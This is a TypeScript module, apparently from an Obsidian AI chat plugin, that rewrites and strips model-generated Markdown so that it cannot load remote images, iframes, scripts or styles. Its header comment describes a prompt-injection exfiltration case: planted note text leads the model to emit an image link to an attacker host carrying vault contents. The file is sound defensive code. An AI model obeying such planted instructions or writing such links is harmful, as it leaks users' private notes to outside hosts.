/**
 * Keeps chat output from reaching the network.
 *
 * The chat renders the model's answer as Markdown, and Obsidian loads any remote
 * image, iframe, video or stylesheet that Markdown points at as soon as it is
 * rendered. A note the agent reads (a web clipping, a shared file) can carry
 * instructions that make the model write `![](https://attacker/?q=<your notes>)`,
 * which would send vault text to that host without a click. So before rendering,
 * remote embeds become plain text, raw HTML that could load something is shown as
 * text, and note embeds become links. Links stay links: following one is the
 * user's own click.
 */

/** Tags that load nothing and are harmless without attributes. */
const SAFE_TAGS = new Set([
	'b', 'i', 'u', 's', 'em', 'strong', 'del', 'ins', 'mark', 'small', 'sub', 'sup', 'kbd', 'code', 'pre', 'samp', 'var',
	'br', 'hr', 'p', 'div', 'span', 'blockquote', 'details', 'summary', 'ul', 'ol', 'li', 'dl', 'dt', 'dd',
	'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
]);

const IMAGE_EXTENSIONS = /\.(png|jpe?g|gif|bmp|svg|webp|avif|ico|tiff?)$/i;

/** True for a URL the browser would fetch from somewhere other than the vault. */
export function isRemoteUrl(url: string): boolean {
	const u = url.trim().replace(/^<|>$/g, '');
	if (/^\/\//.test(u)) return true;
	const scheme = u.match(/^([a-z][a-z0-9+.-]*):/i)?.[1]?.toLowerCase();
	if (!scheme) return false; // A vault path.
	return !['app', 'data', 'blob', 'capacitor'].includes(scheme);
}

function hostOf(url: string): string {
	const u = url.trim().replace(/^<|>$/g, '');
	try {
		return new URL(u.startsWith('//') ? `https:${u}` : u).host || u;
	} catch {
		return u.slice(0, 60);
	}
}

function blockedImage(url: string): string {
	return `*(remote image not loaded: ${hostOf(url).replace(/[*_`[\]\\]/g, '')})*`;
}

/** Splits Markdown into code (rendered literally, left alone) and prose. */
function splitCode(markdown: string): Array<{ code: boolean; text: string }> {
	const parts: Array<{ code: boolean; text: string }> = [];
	// Fenced blocks first, then inline code spans.
	const fence = /(^|\n)( {0,3})(`{3,}|~{3,})[^\n]*\n[\s\S]*?(?:\n\2?\3[`~]*[ \t]*(?=\n|$)|$)/g;
	let last = 0;
	const pushProse = (text: string) => {
		let i = 0;
		for (const m of text.matchAll(/(`+)[^`][\s\S]*?(?<!`)\1(?!`)/g)) {
			if (m.index! > i) parts.push({ code: false, text: text.slice(i, m.index) });
			parts.push({ code: true, text: m[0] });
			i = m.index! + m[0].length;
		}
		if (i < text.length) parts.push({ code: false, text: text.slice(i) });
	};
	for (const m of markdown.matchAll(fence)) {
		const start = m.index! + m[1].length;
		if (start > last) pushProse(markdown.slice(last, start));
		parts.push({ code: true, text: markdown.slice(start, m.index! + m[0].length) });
		last = m.index! + m[0].length;
	}
	if (last < markdown.length) pushProse(markdown.slice(last));
	return parts;
}

function neutralizeProse(text: string, remoteRefs: Set<string>): string {
	return text
		// ![alt](url "title")
		.replace(/!\[((?:[^\][]|\[[^\]]*\])*)\]\(\s*(<[^>]*>|[^)\s]+)(?:\s+(?:"[^"]*"|'[^']*'|\([^)]*\)))?\s*\)/g, (whole, _alt, url: string) =>
			isRemoteUrl(url) ? blockedImage(url) : whole)
		// ![alt][ref], ![ref][], ![ref]
		.replace(/!\[((?:[^\][]|\[[^\]]*\])*)\](?:\[([^\]]*)\])?(?![(\[])/g, (whole, alt: string, ref?: string) => {
			const id = (ref || alt).trim().toLowerCase();
			return remoteRefs.has(id) ? `*(remote image not loaded)*` : whole;
		})
		// ![[target]]: an embedded note can carry remote content of its own, so it becomes a link.
		.replace(/!\[\[([^\]\n]+)\]\]/g, (whole, target: string) => {
			const path = target.split(/[|#]/)[0].trim();
			if (isRemoteUrl(path)) return blockedImage(path);
			return IMAGE_EXTENSIONS.test(path) ? whole : `[[${target}]]`;
		})
		// Raw HTML: keep plain formatting tags, show anything else as text.
		.replace(/<(\/?)([a-zA-Z][a-zA-Z0-9-]*)((?:[^>"']|"[^"]*"|'[^']*')*)>/g, (whole, _slash, tag: string, attrs: string) => {
			if (/^:/.test(attrs) || /@/.test(tag + attrs) && !/\s/.test(attrs)) return whole; // <https://...> or <me@x.com> autolinks
			if (SAFE_TAGS.has(tag.toLowerCase()) && /^\s*\/?\s*$/.test(attrs)) return whole;
			return `&lt;${whole.slice(1)}`;
		});
}

/** Rewrites Markdown so rendering it can't fetch anything from the network. */
export function blockRemoteContent(markdown: string): string {
	if (!markdown) return markdown;
	const parts = splitCode(markdown);
	const remoteRefs = new Set<string>();
	for (const p of parts) {
		if (p.code) continue;
		for (const m of p.text.matchAll(/^ {0,3}\[([^\]]+)\]:\s*(<[^>]*>|\S+)/gm)) {
			if (isRemoteUrl(m[2])) remoteRefs.add(m[1].trim().toLowerCase());
		}
	}
	return parts.map((p) => (p.code ? p.text : neutralizeProse(p.text, remoteRefs))).join('');
}

const URL_ATTRIBUTES = ['src', 'srcset', 'poster', 'data', 'background', 'xlink:href', 'formaction', 'action'];

/**
 * Second line of defence after rendering: strips any remote URL attribute that
 * still made it into the rendered element (links keep their href).
 */
export function stripRemoteResources(root: HTMLElement): number {
	let removed = 0;
	const all = [root, ...Array.from(root.querySelectorAll('*'))];
	for (const el of all) {
		const tag = el.tagName.toLowerCase();
		if (['iframe', 'frame', 'object', 'embed', 'link', 'meta', 'base', 'style', 'script'].includes(tag) && el !== root) {
			el.remove();
			removed++;
			continue;
		}
		for (const attr of URL_ATTRIBUTES) {
			const value = el.getAttribute(attr);
			if (value === null) continue;
			const urls = attr === 'srcset' ? value.split(',').map((s) => s.trim().split(/\s+/)[0]) : [value];
			if (urls.some(isRemoteUrl)) {
				el.removeAttribute(attr);
				removed++;
			}
		}
		const href = tag === 'image' || tag === 'use' ? el.getAttribute('href') : null;
		if (href && isRemoteUrl(href)) {
			el.removeAttribute('href');
			removed++;
		}
		const style = el.getAttribute('style');
		if (style && /url\s*\(|@import/i.test(style)) {
			el.removeAttribute('style');
			removed++;
		}
	}
	return removed;
}
